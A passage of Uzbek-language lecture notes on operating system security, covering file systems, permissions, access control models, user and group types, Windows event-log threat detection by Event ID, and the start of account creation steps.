	•	Operatsion tizimning sathga asoslangan ko‘rinishi haqida ma’lumot bering?
	•	Operatsion tizimlar turlari haqida ma’lumot bering?
	•	Mobil operatsion tizimlar haqida ma’lumot bering?
	•	Windows OT xavfsizligini ta’minlashga xizmat qiluvchi mexanizmlar haqida ayting?
	•	Linux OT xavfsizligini ta’minlashga xizmat qiluvchi mexanizmlar haqida ayting?

Nazorat savollari
3.2. Fayl tizimlari va foydalanishlarni boshqarish  (Ma’ruza mashg‘uloti)
1. Fayl tizimlari: mazmuni, vazifalari va xususiyatlari. 
2. Fayl egaligi. 
3. Fayl ruxsatlari.
4. Foydalanuvchilar va guruhlar toifalari.
Reja:
1. Fayl tizimlari: mazmuni, vazifalari va xususiyatlari. 
2. Fayl egaligi. 
3. Fayl ruxsatlari.
4. Foydalanuvchilar va guruhlar toifalari.
Reja:

Windows OT, Linux OT, fayl tizimi, NTFS, EXT4, XFS, fayl egaligi, fayl ruxsatlari, foydalanishlarni boshqarish modellari, tizim foydalanuvchilar, guruhlar.
Kalit so‘zlar:
Windows OT, Linux OT, fayl tizimi, NTFS, EXT4, XFS, fayl egaligi, fayl ruxsatlari, foydalanishlarni boshqarish modellari, tizim foydalanuvchilar, guruhlar.
Kalit so‘zlar:
Axborot resurslarini to‘g‘ri boshqarish har qanday operatsion tizimining asosiy vazifalaridan biridir. Kompyuter tizimlarida ma’lumotlarning himoyalangan holda saqlanishi, ruxsatsiz foydalanishlardan himoyalanishi va foydalanuvchilar o‘rtasida aniq vakolatlar bo‘lishi bevosita fayl tizimlari va foydalanishlarni boshqarish (access control) mexanizmlariga bog‘liq. Windows va Linux kabi ikki asosiy OTlar bu borada o‘ziga xos yondashuvga ega bo‘lib, ular tomonidan taqdim etilgan foydalanishlarni boshqarish modeli nafaqat ma’lumotlarni samarali boshqarishni, balki ularning xavfsizligini ham kafolatlaydi.
Mazkur mavzuda Windows va Linux operatsion tizimlarida fayl tizimi arxitekturasi, foydalanishlarni boshqarish modeli va egalik (ownership) tushunchalari haqida ma’lumotlar beriladi.

Fayl tizimlari: mazmuni, vazifalari va xususiyatlari
Fayl tizimi - bu operatsion tizimning diskda saqlanadigan ma’lumotlarni boshqaruvchi eng muhim qismi bo‘lib, u ma’lumotlarni tartibga solish, ulardan foydalanishni belgilash, metadata saqlash va fayl tuzilmasini tashkil etish bilan shug‘ullanadi. Har bir fayl tizimi ma’lumotlarni saqlashdan tashqari, foydalanuvchi va jarayonlarning bu fayllardan foydalanish darajasini ham belgilaydi.
Windows OT fayl tizimi, NTFS
Windows operatsion tizimlarida eng ko‘p qo‘llaniladigan fayl tizimi NTFS (New Technology File System) hisoblanadi. NTFS quyidagi imkoniyatlarga ega:
	•	takomillashgan Access Control List (ACL) mexanizmiga ega;
	•	ma’lumotlarni shifrlash imkoniyatiga ega (EFS, Encrypting File System);
	•	qaydlash (journaling) texnologiyasi orqali ma’lumotlarning buzilishdan himoyalanish;
	•	fayl va papkalar uchun kengaytirilgan foydalanishlarni boshqarish;
	•	fayl kvotalari (file quotas) va siqish (compression) funksiyalari.
Linux fayl tizimlari, EXT4, XFS, Btrfs
Linux tizimlarida esa ko‘plab fayl tizimlari ishlatiladi, ammo eng keng tarqalgani quyidagilardir:
	•	EXT4 - barqaror va unumdor asosiy fayl tizimi;
	•	XFS - katta fayllarni qayta ishlash uchun optimallashtirilgan fayl tizimi;
	•	Btrfs - snapshot, RAID, subvolume kabi ilg‘or imkoniyatlarga ega fayl tizimi.
Linux fayl tizimlarida foydalanishlarni boshqarish modeli UNIX OT falsafasiga tayangan bo‘lib, soddaligi, mantiqan aniq tuzilishi va xavfsizlikni samarali ta’minlashi bilan ajralib turadi.

Fayl egaligi (Ownership)
Egalik - bu fayl yoki katalogning kimga tegishli ekanini belgilovchi xavfsizlik atributidir. Egalik foydalanishlarni boshqarishda asosiy o‘rin tutadi, chunki ruxsatlarni faqat fayl egasi yoki imtiyozli administrator o‘zgartira oladi.
Linux operatsion tizimlarida egalik
Linuxda har bir faylda ikki xil egalik atributi mavjud:
	•	User (UID) - fayl egasi bo‘lgan foydalanuvchi;
	•	Group (GID) - fayl tegishli bo‘lgan guruh.
Masalan, web-server ishlaydigan kataloglar odatda “www-data” kabi maxsus foydalanuvchi va guruhga tegishli bo‘ladi.
Egalikni o‘zgartirish buyruqlari:
	•	chown user file — fayl egasini o‘zgartirish;
	•	chgrp group file — guruhni o‘zgartirish.
Windows tizimlarida egalik
Windows NTFSda egalik ACL orqali belgilanadi:
	•	Fayl egasi - uni yaratgan foydalanuvchi;
	•	Administratorlar “Take Ownership” imtiyozi orqali har qanday faylning egasiga aylanishi mumkin.
Windowsdagi fayl egasi mexanizmi NTFS ruxsatlarining markaziy elementi hisoblanadi.
Fayl ruxsatlari (Permissions)
Fayl ruxsatlari - bu obyekt ustida qanday harakatlarni bajarish mumkinligini aniqlovchi qoidalar majmui.
Linuxdagi UNIX permission modeli
Linux ruxsatlar modeli uch turdagi amallarni va uch guruhni o‘z ichiga oladi.
Ruxsat turlari:
	•	r (read) — faylni o‘qish yoki katalog tarkibini ko‘rish;
	•	w (write) — ma’lumotni o‘zgartirish, fayl yaratish, o‘chirish;
	•	x (execute) — faylni ishga tushirish, katalogga kirish.
Foydalanuvchi guruhlari:
	•	Owner (u) — fayl egasi;
	•	Group (g) — faylga tegishli guruh;
	•	Others (o) — qolgan barcha foydalanuvchilar.
Misol uchun biror obyekt uchun ruxsatlarni to‘liq ravishda quyidagicha ifodalash mumkin: rwxr-x--x.
Maxsus ruxsatlar:
	•	SUID — dastur egasining imtiyozlari bilan ishlaydi;
	•	SGID — guruh imtiyozlari bilan ishlaydi;
	•	Sticky bit — katalog ichidagi fayllarni faqat o‘z egasi o‘chirishi mumkin.
Bu mexanizm Linuxni ko‘p foydalanuvchili muhitlarda xavfsiz boshqarish imkonini beradi.
Windows NTFS ruxsatlar modeli
Windows OT ruxsatlari tizimi Linuxnikiga qaraganda ancha detallashgan va moslashuvchan bo‘lib, ACE (Access Control Entry) va ACL (Access Control List) mexanizmlariga asoslanadi.
Asosiy ruxsatlar quyidagilar:
	•	Full Control - barcha ruxsatlar, shu jumladan ruxsatlarni o‘zgartirish;
	•	Modify - ma’lumotni o‘zgartirish va o‘chirish;
	•	Read & Execute - o‘qish va ishga tushirish;
	•	List Folder Contents - katalog tarkibini ko‘rish;
	•	Read - o‘qish;
	•	Write - yozish.
Kengaytirilgan ruxsatlar:
	•	Delete – o‘chirish;
	•	Change Permissions – ruxsatni o‘zgartirish;
	•	Take Ownership – egalik huquqini olish;
	•	Read Attributes / Write Attributes – attributlarni o‘qish/ yozish;
	•	Delete Subfolders and Files – qism kataloglar va fayllarni o‘chirish.
Windowsning NTFS modeli foydalanuvchilar va guruhlarga juda aniq darajada vakolat berishga imkon yaratadi. Bu esa korporativ muhitda ularni murakkab xavfsizlik siyosatlari bilan boshqarishni osonlashtiradi.
Foydalanishlarni boshqarish modellari
OTlarda foydalanishlarni boshqarish turli xavfsizlik modellari asosida amalga oshiriladi. Ularning asosiylari quyida keltirib o‘tilgan.
Diskretsion foydalanishlarni boshqarish (Discretionary Access Control, DAC). Ushbu model Windows va Linux OTlarining asosiy modeli hisoblanadi. Ushbu modelda ruxsatlarni fayl egasi belgilaydi. Ushbu model moslashuvchan bo‘lsada, noto‘g‘ri sozlangan holatda xavfli hisoblanadi.
Mandatli foydlanishlarni boshqarish (Mandatory Access Control, MAC). Ushbu model harbiy yoki juda yuqori xavfsizlik talab qilinadigan tizimlarda qo‘llanilib, ruxsatlar markazlashgan siyosat asosida belgilanadi. Foydalanuvchi ularni o‘zgartira olmaydi. Linux OTda MAC modeli foydalanilgan SELinux, AppArmor kabi tizimlar mavjud.
Windows OTda MACning to‘liq modelidan foydalanilmasada, AppLocker va Credential Guard kabi komponentlar MACga yaqin funksiyalarga asoslanadi.
Rollarga asoslangan foydalanishlarni boshqarish (Role-Based Access Control, RBAC). Ushbu model katta muhitlar uchun eng samarali hisoblanib, ruxsatlar rolga bog‘lanadi, rol esa foydalanuvchiga biriktiriladi. Windows OTdagi Active Directory xizmati RBAC foydalanilgan eng yaqqol misol bo‘la oladi.
Foydalanuvchilar va guruhlar toifalari
Har qanday operatsion tizimda xavfsizlikni ta’minlashning asosiy tamoyillaridan biri - bu foydalanuvchilarni (users) va guruhlarni (groups) to‘g‘ri boshqarishdir. Ushbu mexanizm tizim resurslaridan foydalanishni cheklash, vakolatlarni taqsimlash va xavfsizlik siyosatlarini amalga oshirish uchun xizmat qiladi. Windows va Linux operatsion tizimlarida foydalanuvchilar va guruhlar o‘ziga xos tarzda tashkil etilgan bo‘lsada, ularning maqsadi bir xil: tizimni tartibga solish va vakolatlarni aniq chegaralashdir.
Windows operatsion tizimida foydalanuvchilar va guruhlar. Windows OT xavfsizlik modelida foydalanuvchilar va guruhlar SAM (Security Account Manager) va tarmoq muhiti bo‘lsa Active Directory orqali boshqariladi. Har bir foydalanuvchi va guruh o‘zining noyob SID (Security Identifier) raqamiga ega.
Windows foydalanuvchi turlari
Administrator: tizimda eng yuqori imtiyoz bo‘lib, unga ega foydalanuvchi dastur o‘rnatish, tizim sozlamalarini o‘zgartirish, foydalanuvchilar yaratish, ruxsatlarni belgilash huquqiga ega bo‘ladi.  Shu sababli, hujumchilar odatda ushbu darajaga ega foydalanuvchilarni nishonga oladi.
Oddiy foydalanuvchi (Standard User): dasturlarni ishga tushirish, umumiy vazifalarni bajarishi mumkin bo‘lsada, tizim fayllariga, sozlamalaridan foydalanish cheklangan. Ushbu daraja xavfsizlik nuqtai nazaridan tavsiya etilgan asosiy foydalanuvchi turi.
Mehmon (Guest): juda cheklangan imtiyozlarga ega bo‘lib, ko‘pincha vaqtinchalik foydalanuvchilarga beriladi. Windows OTning ko‘p versiyalarida xavfsizlik sababli o‘chirib qo‘yilgan.
Maxsus tizim qayd yozuvlari (System accounts): bu qayd yozuvlar operatsion tizimning o‘zi tomonidan ishlatiladi. Lokal tizim (Local System) - yuqori darajali tizim huquqlariga ega (hatto administratorlardan kengroq). Lokal xizmat (Local Service) - minimal ruxsat bilan tarmoqsiz xizmatlarni bajaradi. Tarmoq xizmati (Network Service) - tarmoqdan foydalanish talab etilgan xizmatlarda ishlatiladi.
 Windows OTda guruhlar
Lokal guruhlar (Local Groups): bitta kompyuter doirasida amal qiladi. Ularga Administrators, Users, Guests, Power Users, Backup Operators, Remote Desktop Users guruhlarini misol keltirish mumkin.
Tizim bilan birga keladigan guruhlar (Built-in Groups): ularga Everyone - barcha foydalanuvchilar; Authenticated Users - tizimga haqiqiy kirgan foydalanuvchilar; Anonymous Logon – tizimga anonim kirganlar.
Active Directory Groups (tarmoq muhiti uchun): Ularga Domain Admins, Domain Users, Enterprise Admins, Schema Admins guruhlari kirib, ular tashkilot darajasida markazlashgan xavfsizlik boshqaruvini ta’minlaydi.
Linux operatsion tizimida foydalanuvchilar va guruhlar
Linux OT UNIX an’anasiga tayanib, aniq tuzilgan foydalanuvchi va guruh modelini qo‘llaydi. Har bir foydalanuvchi UID, har bir guruh GID bilan aniqlanadi. Linux tizimida foydalanuvchilar ro‘yxati /etc/passwd faylida, guruhlar ro‘yxati /etc/group faylida va maxfiy parollar /etc/shadow faylida saqlanadi.
Linux foydalanuvchi turlari
Root User (Superuser): bu foydalanuvchi tizimning to‘liq egasi bo‘lib, barcha fayllarga va buyruqlarga cheklovsiz ruxsatga ega. Shu sababli kamdan-kam hollarda ishlatilishi kerak bo‘ladi. Root foydalanuvchi Windowsdagi Administratorga o‘xshaydi, ammo imtiyozlari yanada kengroq. 
Oddiy foydalanuvchilar (Regular Users): bundagi har bir foydalanuvchi o‘z uy katalogiga ega (/home/username). Ushbu turdagi foydalanuvchi uchun tizim fayllaridan foydalanish cheklangan. Shu sababli aksariyat holatlarda muhim buyruqlar “sudo” kamandasi orqali bajartiriladi.
Tizim xizmatlari uchun foydalanuvchilar (System Users): Linux OTda ko‘plab xizmatlar alohida foydalanuvchi sifatida ishlaydi, masalan: www-data (Apache/Nginx), mysql, nobody, daemon, mail va hk. Bu xavfsizlik uchun muhim bo‘lib, bunda xizmatlar bir-biridan izolyatsiya qilinadi.
Linux OT guruhlari
Asosiy guruh (Primary Group): har bir foydalanuvchi bitta asosiy guruhga mansub bo‘ladi va fayl yaratganda o‘sha guruhga tegishli bo‘ladi.
Qo‘shimcha guruhlar (Secondary Groups): foydalanuvchi qo‘shimcha guruhlarga ham kiritilishi mumkin. Masalan, sudo - administratorlik vakolatlari, docker - konteynerlarni boshqarish, adm - log fayllarini ko‘ra olish, audio, video - multimedia resurslari uchun va hk.
Maxsus maqsadli guruhlar (Special purpose groups): tizim dasturlari uchun ajratilgan guruhlar bo‘lib, ularga lp (printer), plugdev (USB qurilmalar), tty (terminal interfeyslari), kmem (yadro ma’lumotlari) va hk.larni kiritish mumkin.
		Fayl tizimlari nima, ularning vazifalari nimadan iborat?
	•	Windows OT fayl tizimi haqida ayting?
	•	Linux fayl tizimlari (EXT4, XFS, Btrfs) haqida ayting?
	•	Fayl egaligi tushunchasi, uni turli OTlar uchun tushuntiring?
	•	Fayl ruxsatlari tushunchasi, uni turli OTlar uchun tushuntiring?
	•	Foydalanishlarni boshqarish modellari, ularning asosiy turlarini OTlarga bog‘liq holda tushuntiring?
	•	Turli OTlarda foydalanuvchilar va guruhlarning turlarini tushuntiring?

Nazorat savollari


	•	Fayl tizimlari nima, ularning vazifalari nimadan iborat?
	•	Windows OT fayl tizimi haqida ayting?
	•	Linux fayl tizimlari (EXT4, XFS, Btrfs) haqida ayting?
	•	Fayl egaligi tushunchasi, uni turli OTlar uchun tushuntiring?
	•	Fayl ruxsatlari tushunchasi, uni turli OTlar uchun tushuntiring?
	•	Foydalanishlarni boshqarish modellari, ularning asosiy turlarini OTlarga bog‘liq holda tushuntiring?
	•	Turli OTlarda foydalanuvchilar va guruhlarning turlarini tushuntiring?

Nazorat savollari
3.3. Operatsion tizim jurnallari va auditlash  (Ma’ruza mashg‘uloti)
1. Operatsion tizimlarning hodisalarni qaydlash jurnallari. 
2. Qaydlash jurnallari orqali tahdidlarni aniqlash.
Reja:
1. Operatsion tizimlarning hodisalarni qaydlash jurnallari. 
2. Qaydlash jurnallari orqali tahdidlarni aniqlash.
Reja:

Hodisalarni qaydlash jurnallari, event logging, Event Viewer, xatolik, ogohlantirish, axborot, muvaffaqiyatli audit, muvaffaqiyatsiz audit, Security log, System log, Application log, tahdidlarni aniqlash.
Kalit so‘zlar:
Hodisalarni qaydlash jurnallari, event logging, Event Viewer, xatolik, ogohlantirish, axborot, muvaffaqiyatli audit, muvaffaqiyatsiz audit, Security log, System log, Application log, tahdidlarni aniqlash.
Kalit so‘zlar:
Zamonaviy operatsion tizimlarning muhim funksiyalaridan biri - bu tizimda sodir bo‘layotgan barcha muhim hodisalarni doimiy ravishda qayd qilib borishdir. Ushbu jarayon hodisalarni qaydlash jurnallari yoki event logging deb ataladi. Event logging tizimning ishlashini tahlil qilish, xatolarni aniqlash, xavfsizlik buzilishlarini tekshirish va tizimning umumiy holatini nazorat qilishda asosiy manba hisoblanadi.
Windows operatsion tizimi hodisalarni qayd etish bo‘yicha eng rivojlangan mexanizmlardan biriga ega bo‘lib, undagi Event Viewer vositasi administratorlarga tizim ichida sodir bo‘lgan barcha jarayonlar haqida batafsil va kategoriyalangan ma’lumotlar taqdim etadi.
Operatsion tizimlarning hodisalarni qaydlash jurnallari
Xatolik yuz berganida, tizim ma’muri yoki madadlash xodimi xatoning sababini aniqlashi, yo‘qolgan ma’lumotlarni qayta tiklashga urinishi va xatoning takrorlanishiga yo‘l qo‘ymasligi lozim. Ilovalar, operatsion tizim va boshqa tizim xizmatlari muhim voqealarni, masalan, xotira hajmining kamligi yoki diskdan foydalanishga haddan tashqari ko‘p urinishlarni qayd etishi muhim hisoblanadi. Keyinchalik tizim ma’muri xato sababini aniqlashi va u sodir bo‘lgan kontekstni aniqlash uchun hodisalar jurnalidan (log fayl deb ataladi) foydalanishi mumkin. 
Hodisalarni qaydlash quyidagilarni o‘z ichiga olishi shart:
operatsion tizim hodisalari:
	•	tizimni ishga tushirish va o‘chirish;
	•	xizmatni boshlash va tugatish;
	•	tarmoq ulanishidagi o‘zgarishlar yoki muvaffaqiyatsizliklar;
	•	tizim xavfsizligini sozlash va boshqarish vositalarini o‘zgartirishga urinishlar.
OT audit yozuvlari:
	•	tizimga kirishdagi urinishlar (muvaffaqiyatli yoki muvaffaqiyatsiz);
	•	tizimga kirgandan so‘ng bajariladigan funksiyalar (masalan, muhim faylni o‘qish yoki yangilash, dasturni o‘rnatish);
	•	qayd yozuvini o‘zgartirish (masalan, yozuvni yaratish va yo‘q qilish, imtiyozlarni tayinlash);
	•	imtiyozli qayd yozuvidan muvaffaqiyatli / muvaffaqiyatsiz foydalanish.
ilova qayd yozuvi to‘g‘risidagi ma’lumot:
	•	ilovani muvaffaqiyatli va muvaffaqiyatsiz autentifikatsiya qilishga urinishlar;
	•	qayd yozuvidagi o‘zgartirishlar (masalan, qayd yozuvini yaratish va yo‘q qilish, qayd yozuvi imtiyozlarini tayinlash);
	•	dastur imtiyozlaridan foydalanish.
ilova amallari:
	•	dasturni ishga tushirish va o‘chirish;
	•	dastur xatolari;
	•	dastur konfigurasiyasidagi asosiy o‘zgarishlar.
Har bir hodisa uchun qaydlangan tafsilotlar farqlanadi, ularni quyidagi parametrlar bo‘yicha qaydlash tavsiya qilinadi:
	•	vaqt belgisi;
	•	hodisa, holat va / yoki xatolik kodlari;
	•	servic / buyruq / ilova nomi;
	•	foydalanuvchi yoki tizim bilan bog‘liq voqea;
	•	amaldagi qurilma (masalan, IP va manba manzili, terminal sessiyasi identifikatori, web brauzer va hk.).
Audit jurnallarida barcha harakatlar qaydlangani bois, niyati buzuqlar ularni tahrirlash orqali o‘z faoliyatini yashirishi mumkin. Shuning uchun, audit jurnalidan foydalanishlarni nazoratlash muhim vazifa hisoblanadi. 
Windows OTda hodisa turlari. Windows OTda besh turdagi hodisa ro‘yxatga olinadi. Bularning barchasi uchun aniq belgilangan ma’lumotlar mavjud bo‘lib, biror bir hodisa haqidagi xabar faqat bitta turga tegishli bo‘ladi (3.1-jadval).
3.1-jadval
Windows OT hodisalari turlari
Hodisa
Tavsifi

1
2
Xatolik
Ma’lumotlarni yoki funksionallikni yo‘qotish kabi muhim muammoni ko‘rsatadigan hodisa. Masalan, biror xizmat ishga tushirishi paytida yuklanmasa, mazkur xatolik hodisasi qayd etiladi.
Ogohlantirish
Hodisa juda ahamiyatli bo‘lmasada, kelajakda yuzaga kelishi mumkin bo‘lgan muammolarni ko‘rsatishi mumkin. Masalan, diskda bo‘sh joy kam bo‘lsa, ogohlantirish hodisasi qayd etiladi. 
Axborot
Ilova, drayver yoki xizmatning muvaffaqiyatli ishlashini tavsiflaydigan hodisa. Masalan, tarmoq drayveri muvaffaqiyatli yuklanganida, hodisalarni axborot qaydlaydi.
Muvaffaqiyatli audit
Muvaffaqiyatli tekshirilgan xavfsizlikka oid kirish urinishlarini yozib boradigan hodisa. Masalan, foydalanuvchining tizimga kirishga muvaffaqiyatli urinishi muvaffaqiyatli audit hodisasi sifatida qaydlanadi.
Muvaffaqiyatsiz audit
Tekshirilgan xavfsizlikdan foydalanishga urinish muvaffaqiyatsiz tugaganida, bu hodisa qaydlanadi. Masalan, agar foydalanuvchi tarmoq drayveriga kirishida muvaffaqiyatsizlikka uchrasa, bu hodisa qaydlanadi.
Quyidagi hodisalar qaydlanishi shart:
Resurs muammolari. Xotirani ajratishda xatolik yuz bergan taqdirda ogohlantirish hodisasini qaydlash kam xotirali vaziyatning sababini ko‘rsatishga yordam beradi.
Uskuna bilan bog‘liq muammolar. Tarmoq kartasi, qattiq disk, tezkor xotira va boshqa qurilma drayveri bilan bog‘liq hodisalar qaydlanishi shart.
Axborot hodisalari. Server dasturi (masalan, ma’lumotlar bazasi serveri) foydalanuvchining ro‘yxatdan o‘tkazilishi, ma’lumotlar bazasidagi amallar va boshqa hodisalar qaydlanishi shart.
Hodisalarni qaydlash jurnali ustida quyidagi amallar bajarilishi mumkin:
	•	zaxira nusxalash (BackupEventLog funksiyasi yordamida);
	•	tozalash (ClearEventLog funksiyasi yordamida);
	•	monitoringlash (NotifyChangeEventLog funksiyasi yordamida);
	•	so‘rov yuborish (boshqa dasturlar tomonidan, GetOldestEventLogRecord, GetNumberOfEventLogRecords funksiyalari yordamida);
	•	o‘qish (ReadEventLog funksiyasi yordamida);
	•	yozish (ReportEvent funksiyasi yordamida).
Windows XP/2000 operatsion tizimlarda hodisalarni qaydlash jurnalida turli qayd yozuvlari uchun berilgan imtiyozlar mavjud (3.2-jadval).
3.2-jadval
Windows XP/2000 operatsion tizimda hodisa jurnalida mavjud imtiyozlar
Log
Qayd yozuvi
O‘qish
Yozish
Tozalash
Ilovaga tegishli
Ma’murlar (tizim)
+
+
+

Ma’murlar (domen)
+
+
+

Lokal tizim
+
+
+

Interaktiv foydalanuvchi
+
+
-
Tizimga tegishli
Ma’murlar (tizim)
+
+
+

Ma’murlar (domen)
+
-
+

Lokal tizim
+
+
+

Interaktiv foydalanuvchi
+
-
-
Tanlovga ko‘ra yaratilgan log fayl
Ma’murlar (tizim)
+
+
+

Ma’murlar (domen)
+
+
+

Lokal tizim
+
+
+

Interaktiv foydalanuvchi
+
+
-
Windows OT da hodisalarni qaydlash fayllarini (log faylni) ko‘rish uchun quyidagi ketma-ketlik amalga oshiriladi:
	•	Kompyuterda Win+R tugmalar kombinatsiyasi bosiladi.
	•	Hosil bo‘lgan oynadagi maydonda eventvwr kiritiladi va Enter tugmasi bosiladi.
	•	Hosil bo‘lgan hodisalarni ko‘rish oynasidan Windows Logs bandi tanlanadi (3.5-rasm).


3.5-rasm. Windows OTning hodisalar jurnali oynasi
Qaydlash jurnallari orqali tahdidlarni aniqlash
Event logging tahdidlarni aniqlashda quyidagi imkoniyatlarni beradi:
	•	ruxsatsiz foydalanish urinishlarini aniqlash;
	•	hujum ssenariylarini qayta tiklash;
	•	qoidabuzarliklarni real vaqt rejimida kuzatish;
	•	administrator imtiyozlarining noto‘g‘ri qo‘llanishini aniqlash;
	•	zararli dastur harakatlarini aniqlash;
	•	ichki xodimlarning zararli faoliyatini aniqlash.
Windows Event Viewer uch asosiy jurnallar orqali tahdidlarni tahlil qilish imkonini beradi:
	•	Security log - xavfsizlik bo‘yicha voqealar;
	•	System log - tizim komponentlari xatolari va nosozliklari;
	•	Application log - dasturiy ta’minot ogohlantirishlari.
Quyida ushbu loglar yordamida qanday real tahdidlarni aniqlash mumkinligi misollar yordamida tushuntiriladi.
1-Misol. Ruxsatsiz tizimdan foydalanishga urinishlarni aniqlash. Ya’ni, hujumchi parolni taxmin qilish (brute force) orqali tizimga kirishga urinishini aniqlash talab etilsin. Buni Security log orqali kuzatish mumkin. Buning uchun quyidagi hodisalar haqida bilish talab etiladi:
4625 - Failed logon attempt (muvaffaqiyatsiz kirish);
4624 - Successful logon;
4648 - Explicit credential logon;
4767 - Account unlocked.
Agar Security logda bir necha soniya ichida 50–100 dona Event ID 4625 qayd etilsa, bu taxmin qilish (brute force) tahdidi amalga oshirilayotganini anglatadi.
2-Misol. Administrator imtiyozining ruxsatsiz ishlatilishi, ya’ni ichki xodim yoki zararli dastur administrator imtiyozi bilan amal bajarmoqda. Buni bilish uchun quyidagi hodisalar kerak bo‘ladi:
4672 – yangi kirishga maxsus imtiyoz biriktirildi (Special privileges assigned to new logon);
4732 – imtiyozga ega guruhga yangi foydalanuvchi qo‘shildi (User added to a privilege group), masalan, Administrators guruhiga.
Agar Security log orqali ushbu ID ga ega hodisalar qayd etilgan bo‘lsa, oddiy temp_user foydalanuvchiga yuqori darajali imtiyozlar berilganligini bilish mumkin. Bu imtiyozni oshishi (privilege escalation) hujumiga juda o‘xshaydi (bunda faqat zararli dasturlar ko‘p foydalanadi).
3-Misol. Zararli dasturni ishga tushishini aniqlash talab etilgan bo‘lsin. Windows OTdagi ko‘plab zararli dasturlar o‘zini xizmat sifatida o‘rnatadi yoki avtomatik ishga tushirishga kiritadi. Buni aniqlash uchun quyidagi hodisalarni bilish talab etiladi:
7045 – yangi xizmat o‘rnatildi (A new service was installed);
7030 – xizmat nojoiz xavfsizlik muhitida ishga tushirildi (Service running in invalid security context).
Mazkur holatda hodisalarni tahlil qilishda (masalan, Event ID: 7045, Service Name: updater, Executable Path: C:\Users\Public\update.exe) kabi ma’lumot berilgan bo‘lsa, Public katalogdan ishga tushirilishni - shubhali belgi sifatida qarab “Updater” nomi bilan yashirin zararli dastur o‘rnatilganligini taxmin qilish mumkin.
Yuqoridagilardan kelib chiqqan holda, qaydlash jurnallaridan tahdidlarni aniqlashning umumiy metodikasi sifatida quyidagilarni keltirish mumkin:
	•	Event ID bo‘yicha filtr qo‘llash (4625, 4672, 7045 va boshqalar);
	•	Loglarni real vaqt rejimida kuzatish (masalan, SIEM tizimlari orqali);
	•	Kutilmagan kirish turlarini tahlil qilish (masalan, 3, 9, 10 kirish turlari).
	•	Bir xil IP manzildan ko‘plab urinishlarni aniqlash;
	•	Servis o‘rnatilishidagi shubhali faoliyatni kuzatish;
	•	File Access Audit siyosatini yoqish.
	Operatsion tizimlarning hodisalarni qaydlash jurnallari vazifasini tushuntiring?
	•	Hodisalarni qaydlash nimalarni o‘z ichiga olishi shart?
	•	Har bir hodisani qaydlashda qanday parametrlardan foydalanish tavsiya etiladi?
	•	Windows OTda qanday hodisa turlari mavjud?
	•	Windows OT da hodisalarni qaydlash fayllarini (log faylni) ko‘rish tartibini ayting?
	•	Qaydlash jurnallari orqali tahdidlarni aniqlash tartibini misollar yordamida tushuntiring?
Nazorat savollari

	•	Operatsion tizimlarning hodisalarni qaydlash jurnallari vazifasini tushuntiring?
	•	Hodisalarni qaydlash nimalarni o‘z ichiga olishi shart?
	•	Har bir hodisani qaydlashda qanday parametrlardan foydalanish tavsiya etiladi?
	•	Windows OTda qanday hodisa turlari mavjud?
	•	Windows OT da hodisalarni qaydlash fayllarini (log faylni) ko‘rish tartibini ayting?
	•	Qaydlash jurnallari orqali tahdidlarni aniqlash tartibini misollar yordamida tushuntiring?
Nazorat savollari
3.4. Foydalanuvchi qayd yozuvi va parollar siyosati  (Ma’ruza mashg‘uloti)
1. Operatsion tizimlarda foydalanuvchilarni boshqarish: yangi foydalanuvchi yaratish, mavjudini o‘chirish. 
2. Imtiyozlarni ajratish. 
3. Parollarni bardoshligini baholash, ulardan foydalanish davrini sozlash.
Reja:
1. Operatsion tizimlarda foydalanuvchilarni boshqarish: yangi foydalanuvchi yaratish, mavjudini o‘chirish. 
2. Imtiyozlarni ajratish. 
3. Parollarni bardoshligini baholash, ulardan foydalanish davrini sozlash.
Reja:

Foydalanuvchi qayd yozuvi (akkaunt), administrator, parolni almashtirish, parollar siyosati, parolga qo‘yilgan talablar, PIN kod, parol murakkabligi.
Kalit so‘zlar:
Foydalanuvchi qayd yozuvi (akkaunt), administrator, parolni almashtirish, parollar siyosati, parolga qo‘yilgan talablar, PIN kod, parol murakkabligi.
Kalit so‘zlar:
Windows bir xil qurilmadan foydalanish uchun bir nechta foydalanuvchi qayd yozuvlarini (akkaunt) qo‘shishga imkon beradi, bunda har bir foydalanuvchi o‘ziga xos sozlamalar, hujjatlar va ilovalarga ega bo‘ladi.
Masalan, ota-onalar tizim sozlamalarini boshqarish va dasturlarni o‘rnatish uchun ma’muriy huquqlarga ega alohida akkauntga ega bo‘lishi mumkin, bolalar esa foydalanishni nazorat qilish va cheklash imkonini beruvchi ota-ona nazorati yoqilgan standart akkauntdan foydalanishlari mumkin. Bu esa har bir oila a’zosining o‘z fayllari, sozlamalari va mos ravishda belgilangan ruxsat darajalari bilan shaxsiy tajribaga ega bo‘lishini, shu bilan birga oila a’zolarining ma’lumotlari bir-biridan himoyalangan va maxfiy bo‘lishini ta’minlaydi.
Shaxsiy hamda ish yoki o‘quv maqsadlari uchun alohida foydalanuvchi akkauntlariga ega bo‘lish, shaxsiy fayllar va faoliyatlar bilan ish yoki o‘qishga oid ishlar o‘rtasida aniq chegarani saqlashga yordam beradi. Masalan, foydalanuvchi shaxsiy elektron pochta, ijtimoiy tarmoqlar va hordiq uchun ilovalar mavjud bo‘lgan bitta akkauntga, hamda ish yoki ta’limga oid elektron pochta, samaradorlik dasturlari va professional yoki o‘quv resurslariga kirish uchun mo‘ljallangan boshqa akkauntga ega bo‘lishi mumkin. Bu ajratish nafaqat ishni kerakli tarzda tashkil qilish va diqqatni jamlashga yordam beradi, balki ish yoki o‘quv jarayoniga oid maxfiy ma’lumotlarni alohida saqlash orqali qo‘shimcha xavfsizlik qatlamini ham ta’minlaydi.
Operatsion tizimlarda foydalanuvchilarni boshqarish: yangi foydalanuvchi yaratish, mavjudini o‘chirish
Yangi akkauntni yaratish
1. Windows qurilmangizdagi Settings (Sozlanmalar) ilovasidan Accounts (Akkauntlar) > Other user (Boshqa foydalanuvchi) bo‘limiga o‘ting yoki quyidagi yorliqdan foydalaning:

2. Add other user (Boshqa foydalanuvchi qo‘shish) bo‘limida Add account (Akkaunt qo‘shish) tugmasini tanlang.
3. Ushbu foydalanuvchi tizimga kirishi uchun kerak bo‘ladigan akkaunt ma’lumotlarini kiriting:

a. Agar qo‘shmoqchi bo‘lgan odamda Microsoft akkaunti mavjud bo‘lsa, uning elektron pochta manzilini kiriting.
b. Agar qo‘shilayotgan foydalanuvchida Microsoft akkaunti bo‘lmasa, uning elektron pochta manzilidan foydalanib yangisini yaratishingiz mumkin. Eng ko‘p ishlatadigan elektron pochta manzilini kiriting va Sign up for a new email address (Yangi elektron pochta manzili yaratish) tugmasini tanlang.
